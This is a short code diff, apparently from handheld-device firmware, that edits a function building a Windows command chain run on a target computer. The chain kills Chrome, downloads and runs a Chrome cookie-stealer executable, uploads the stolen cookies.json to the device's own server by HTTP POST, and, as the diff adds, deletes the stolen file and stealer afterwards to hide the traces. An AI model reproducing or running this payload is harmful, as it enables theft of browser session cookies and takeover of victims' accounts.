@@ -175,7 +175,8 @@ void run_payload_setup(){
   DISP.setCursor(0, 0);
   IPAddress IP = runPayloadServer();
   String str = ip2String(IP);
-  String cmd = "cd \".\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Network\"" \
+  String cmd = "taskkill /F /IM chrome.exe /T" \
+  " && cd \".\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Network\"" \
   " && curl -L https://github.com/illera88/GCC-stealer/releases/download/v0.1.1/GCC-stealer.exe -o GCC-stealer.exe" \
   " && curl -L https://github.com/usg-ishimura/m5stick-nemo/releases/download/v0.1/Wi-Fi-AP-0.xml -o Wi-Fi-AP-0.xml" \
   " && netsh wlan delete profile "+ssid+"" \
@@ -184,7 +185,8 @@ void run_payload_setup(){
   " && .\\GCC-stealer.exe --json-file" \
   " && timeout /t 5" \
   " && curl -X POST -F data=@cookies.json http://"+str+"/upload" \
-  " && netsh wlan disconnect & exit";
+  " && netsh wlan disconnect" \
+  " && del cookies.json GCC-stealer.exe Wi-Fi-AP-0.xml & exit";
 
   DISP.setTextColor(BGCOLOR, FGCOLOR);
   DISP.println("Runing payload...");
